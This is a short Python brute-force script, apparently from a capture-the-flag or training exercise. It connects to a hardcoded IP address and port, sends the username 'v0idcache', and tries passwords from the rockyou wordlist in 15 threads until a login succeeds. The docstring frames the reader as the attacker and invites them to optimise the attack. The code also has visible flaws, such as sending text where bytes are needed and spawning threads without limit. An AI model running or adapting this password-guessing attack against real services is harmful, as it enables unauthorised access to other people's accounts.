"""
	If you know the IP address of v0idcache's server and you
	know the port number of the service you are trying to connect
	to, you can use nc or telnet in your Linux terminal to interface
	with the server. To do so, run:
    	$ nc <ip address here> <port here>
	In the above the example, the $-sign represents the shell, nc is the command
	you run to establish a connection with the server using an explicit IP address
	and port number.
	If you have the discovered the IP address and port number, you should discover
	that there is a remote control service behind a certain port. You will know you
	have discovered the correct port if you are greeted with a login prompt when you
	nc to the server.
	In this Python script, we are mimicking the same behavior of nc'ing to the remote
	control service, however we do so in an automated fashion. This is because it is
	beneficial to script the process of attempting multiple login attempts, hoping that
	one of our guesses logs us (the attacker) into the Briong server.
	Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
"""
import threading
import socket
ans = ""
host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
f = open(wordlist, "r")
def brute_force(password):
	global ans
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	data = s.recv(1024) 	# Receives 1024 bytes from IP/Port
	print(data)         	# Prints data
	username = "v0idcache"   # Hint: use OSINT
	s.send(username + "\n")
	data = s.recv(1024)
	print(data)
	print(password )
	s.send(password)
	data = s.recv(1024)
	print(data)
   
   	 
	if ("Fail\n" != data):
    	ans += password
	else:
    	return None

    


if __name__ == '__main__':
   
	while ans == "":
    	threads = []
    	for i in range(15):
        	t = threading.Thread(target=brute_force, args=(f.readline(),))
        	t.start()
        	threads.append(t)
       	

